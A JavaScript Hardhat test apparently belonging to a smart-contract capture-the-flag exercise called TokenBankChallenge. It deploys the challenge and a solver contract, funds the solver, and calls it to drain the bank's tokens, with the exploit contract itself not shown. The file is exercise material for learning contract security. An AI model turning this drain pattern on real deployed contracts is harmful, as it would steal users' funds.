const { expect, assert } = require('chai');
const { BigNumber } = ethers;

describe('TokenBankChallenge', function () {
  it('should solve the challenge', async function () {
    const [owner, alice] = await ethers.getSigners();

    // Deploy challenge
    const TokenBankChallenge = await ethers.getContractFactory('TokenBankChallenge');
    const challenge = await TokenBankChallenge.deploy(alice.address);

    // Deploy solver
    const TokenBankChallengeSolver = await ethers.getContractFactory('TokenBankChallengeSolver');
    const solver = await TokenBankChallengeSolver.deploy(challenge.address);

    const amount = ethers.utils.parseEther('500000');

    // Move funds to the contract
    await challenge.connect(alice).withdraw(amount);
    const tokenAddress = await challenge.token();

    const abi = ['function transfer(address to, uint amount) returns (bool)'];
    const token = new ethers.Contract(tokenAddress, abi, alice);
    await token.connect(alice).transfer(solver.address, amount);

    // Drain funds
    await solver.connect(alice).transferTokens(amount);
    await solver.connect(alice).solveChallenge(amount);

    const result = await challenge.isComplete();
    expect(result).to.be.true;
  });
});
